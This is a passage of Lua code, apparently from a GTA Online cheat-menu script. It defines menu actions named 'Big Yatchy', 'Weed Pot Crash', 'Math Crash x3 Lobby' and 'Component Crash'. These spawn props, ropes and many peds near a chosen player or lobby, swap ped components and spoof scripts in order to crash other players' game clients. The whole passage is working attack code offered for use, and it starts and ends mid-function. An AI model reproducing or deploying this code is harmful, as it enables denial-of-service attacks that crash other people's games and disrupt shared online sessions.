        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT)
        end
        ENTITY.SET_ENTITY_HEALTH(user, 0)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
        ENTITY.SET_ENTITY_VISIBLE(user, true)
    end)
end)

menu.action(bigyachtycrash, "Big Yatchy V5", {"bigyachtyv5"}, "Causes Crash Event (A1:B36122B5) by sending a prop yachtwin.", function()
    local user = PLAYER.GET_PLAYER_PED(players.user())
    local model = util.joaat("h4_mp_apa_yacht_win")
    local pos = players.get_position(pid)
    local oldPos = players.get_position(players.user())
    BlockSyncs(pid, function()
        util.yield(100)
        ENTITY.SET_ENTITY_VISIBLE(user, false)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
        PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
        util.yield(500)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
        util.yield(2500)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT)
        end
        ENTITY.SET_ENTITY_HEALTH(user, 0)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
        ENTITY.SET_ENTITY_VISIBLE(user, true)
    end)
end)

local weedcrash = menu.list(crash, "Weed Crash", {}, "")

    menu.action(weedcrash, "Weed Pot Crash", {"weedcrash"}, "", function()
        local cord = getEntityCoords(getPlayerPed(pid))
        local a1 = entities.create_object(-930879665, cord)
        local a2 = entities.create_object(3613262246, cord)
        local b1 = entities.create_object(452618762, cord)
        local b2 = entities.create_object(3613262246, cord)
        for i = 1, 10 do
            util.request_model(-930879665)
            util.yield(10)
            util.request_model(3613262246)
            util.yield(10)
            util.request_model(452618762)
            util.yield(300)
            entities.delete_by_handle(a1)
            entities.delete_by_handle(a2)
            entities.delete_by_handle(b1)
            entities.delete_by_handle(b2)
            util.request_model(452618762)
            util.yield(10)
            util.request_model(3613262246)
            util.yield(10)
            util.request_model(-930879665)
            util.yield(10)
        end
        util.toast("Finished.")
    end)

    menu.toggle_loop(weedcrash, "Weed Pot Crash", {"toggleweedcrash"}, "", function(on_toggle)
        --notification("Weed Pot Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        local cord = getEntityCoords(getPlayerPed(pid))
        local a1 = entities.create_object(-930879665, cord)
        local a2 = entities.create_object(3613262246, cord)
        local b1 = entities.create_object(452618762, cord)
        local b2 = entities.create_object(3613262246, cord)
        for i = 1, 10 do
            util.request_model(-930879665)
            util.yield(10)
            util.request_model(3613262246)
            util.yield(10)
            util.request_model(452618762)
            util.yield(300)
            entities.delete_by_handle(a1)
            entities.delete_by_handle(a2)
            entities.delete_by_handle(b1)
            entities.delete_by_handle(b2)
            util.request_model(452618762)
            util.yield(10)
            util.request_model(3613262246)
            util.yield(10)
            util.request_model(-930879665)
            util.yield(10)
            return
        end
    end)

    local mathcrash = menu.list(lobbycrash, "Math Crash", {}, "")

menu.action(mathcrash, "Math Crash x3 Lobby", {"math"}, "One of the versions of rope crash.", function()
    --notification("Math Crash x3 Lobby sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local ppos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    pos.x = pos.x+5
    ppos.z = ppos.z+1
    Utillitruck3 = entities.create_vehicle(2132890591, pos, 0)
    Utillitruck3_pos = ENTITY.GET_ENTITY_COORDS(Utillitruck3)
    kur = entities.create_ped(26, 2727244247, ppos, 0)
    kur_pos = ENTITY.GET_ENTITY_COORDS(kur)

    ENTITY.SET_ENTITY_INVINCIBLE(kur, true)
    newRope = PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, "Center")
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, Utillitruck3, kur, Utillitruck3_pos.x, Utillitruck3_pos.y, Utillitruck3_pos.z, kur_pos.x, kur_pos.y, kur_pos.z, 2, 0, 0, "Center", "Center")
    util.yield(100)
    ENTITY.SET_ENTITY_INVINCIBLE(kur, true)
    newRope = PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, "Center")
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, Utillitruck3, kur, Utillitruck3_pos.x, Utillitruck3_pos.y, Utillitruck3_pos.z, kur_pos.x, kur_pos.y, kur_pos.z, 2, 0, 0, "Center", "Center") 
    util.yield(100)

    PHYSICS.ROPE_LOAD_TEXTURES()
    local hashes = {2132890591, 2727244247}
    local pc = getEntityCoords(getPlayerPed(pid))
    local veh = VEHICLE.CREATE_VEHICLE(hashes[i], pc.x + 5, pc.y, pc.z, 0, true, true, false)
    local ped = PED.CREATE_PED(26, hashes[2], pc.x, pc.y, pc.z + 1, 0, true, false)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
    ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
    ENTITY.SET_ENTITY_VISIBLE(ped, false, 0)
    ENTITY.SET_ENTITY_VISIBLE(veh, false, 0)
    local rope = PHYSICS.ADD_ROPE(pc.x + 5, pc.y, pc.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1, true, 0)
    local vehc = getEntityCoords(veh); local pedc = getEntityCoords(ped)
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(rope, veh, ped, vehc.x, vehc.y, vehc.z, pedc.x, pedc.y, pedc.z, 2, 0, 0, "Center", "Center")
    util.yield(1000)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
    PHYSICS.DELETE_CHILD_ROPE(rope)
    PHYSICS.ROPE_UNLOAD_TEXTURES()
end)

menu.toggle_loop(mathcrash, "Math Crash x3 Lobby", {"togglemath"}, "One of the versions of rope crash.", function(on_toggle)
    --notification("Math Crash x3 Lobby sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local ppos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    pos.x = pos.x+5
    ppos.z = ppos.z+1
    Utillitruck3 = entities.create_vehicle(2132890591, pos, 0)
    Utillitruck3_pos = ENTITY.GET_ENTITY_COORDS(Utillitruck3)
    kur = entities.create_ped(26, 2727244247, ppos, 0)
    kur_pos = ENTITY.GET_ENTITY_COORDS(kur)

    ENTITY.SET_ENTITY_INVINCIBLE(kur, true)
    newRope = PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, "Center")
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, Utillitruck3, kur, Utillitruck3_pos.x, Utillitruck3_pos.y, Utillitruck3_pos.z, kur_pos.x, kur_pos.y, kur_pos.z, 2, 0, 0, "Center", "Center")
    util.yield(100)
    ENTITY.SET_ENTITY_INVINCIBLE(kur, true)
    newRope = PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, "Center")
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, Utillitruck3, kur, Utillitruck3_pos.x, Utillitruck3_pos.y, Utillitruck3_pos.z, kur_pos.x, kur_pos.y, kur_pos.z, 2, 0, 0, "Center", "Center") 
    util.yield(100)

    PHYSICS.ROPE_LOAD_TEXTURES()
    local hashes = {2132890591, 2727244247}
    local pc = getEntityCoords(getPlayerPed(pid))
    local veh = VEHICLE.CREATE_VEHICLE(hashes[i], pc.x + 5, pc.y, pc.z, 0, true, true, false)
    local ped = PED.CREATE_PED(26, hashes[2], pc.x, pc.y, pc.z + 1, 0, true, false)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
    ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
    ENTITY.SET_ENTITY_VISIBLE(ped, false, 0)
    ENTITY.SET_ENTITY_VISIBLE(veh, false, 0)
    local rope = PHYSICS.ADD_ROPE(pc.x + 5, pc.y, pc.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1, true, 0)
    local vehc = getEntityCoords(veh); local pedc = getEntityCoords(ped)
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(rope, veh, ped, vehc.x, vehc.y, vehc.z, pedc.x, pedc.y, pedc.z, 2, 0, 0, "Center", "Center")
    util.yield(1000)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
    PHYSICS.DELETE_CHILD_ROPE(rope)
    PHYSICS.ROPE_UNLOAD_TEXTURES()
end)

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

local clothescrash = menu.list(lobbycrash, "Component Crash", {}, "")

menu.action(clothescrash, "Component Crash", {"clothescrash"}, "Warning! Toggle Panic Mode First!", function()
        if pid ~= players.user() then
            util.toast("Wait 20 Seconds...")
            local math_random = math.random
            local joaat = util.joaat
            util.yield(100)
            local pedhash = util.joaat("P_franklin_02")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds1 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds1[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds1[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds1[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds1[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds1[i], 3, 0, 1, 0)
                util.yield()
            end
            util.yield(50)
            for i = 1, ped_amount do
                --entities.delete(SpawnedPeds1[i])
                util.yield(5)
            end
            local pedhash = util.joaat("cs_lazlow")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds2 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds2[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds2[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds2[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds2[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds2[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds2[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds2[i], 3, 0, 3, 0)
                util.yield()
            end
            util.yield(50)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds2[i])
                util.yield(5)
            end
            util.yield(5)
            local pedhash = util.joaat("cs_taocheng")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds3 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds3[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds3[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds3[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds3[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds3[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds3[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds3[i], 3, 2, 1, 0)
                util.yield()
            end
            util.yield(50)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds3[i])
                util.yield(5)
            end
            util.yield(5)
            local pedhash = util.joaat("cs_solomon")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds4 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds4[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds4[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds4[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds4[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds4[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds4[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds4[i], 3, 0, 1, 0)
                util.yield()
            end
            util.yield(50)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds4[i])
                util.yield(5)
            end
            util.yield(5)
            local pedhash = util.joaat("cs_stevehains")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds5 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds5[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds5[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds5[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds5[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds5[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds5[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds5[i], 3, 1, 1, 0)
                util.yield()
            end
            util.yield(50)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds5[i])
                util.yield(5)
            end
            
            local pedhash = util.joaat("cs_taostranslator")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds6 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds6[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds6[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds6[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds6[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds6[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds6[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds6[i], 3, 0, 1, 0)
                util.yield()
            end
            util.yield(50)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds6[i])
                util.yield(5)
            end
            local pedhash = util.joaat("cs_debra")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds7 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds7[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds7[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds7[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds7[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds7[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds7[i], 4, 0, 1, 0)
                util.yield()
            end
            util.yield(50)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds7[i])
                util.yield(5)
            end
            local pedhash = util.joaat("cs_devin")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds8 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds8[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds8[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds8[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds8[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds8[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds8[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds8[i], 3, 1, 1, 0)
                util.yield()
            end
            util.yield(50)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds8[i])
                util.yield(5)
            end
            local pedhash = util.joaat("cs_guadalope")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds9 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds9[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds9[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds9[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds9[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds9[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds9[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds9[i], 3, 0, 1, 0)
                util.yield()
            end
            util.yield(50)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds9[i])
                util.yield(5)
            end
            local pedhash = util.joaat("cs_gurk")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds10 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds10[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds10[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds10[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds10[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds10[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds10[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds10[i], 3, 0, 1, 0)
                util.yield()
            end
            util.yield(50)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds10[i])
                util.yield(5)
            end
            
            local pedhash = util.joaat("cs_jimmydisanto")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
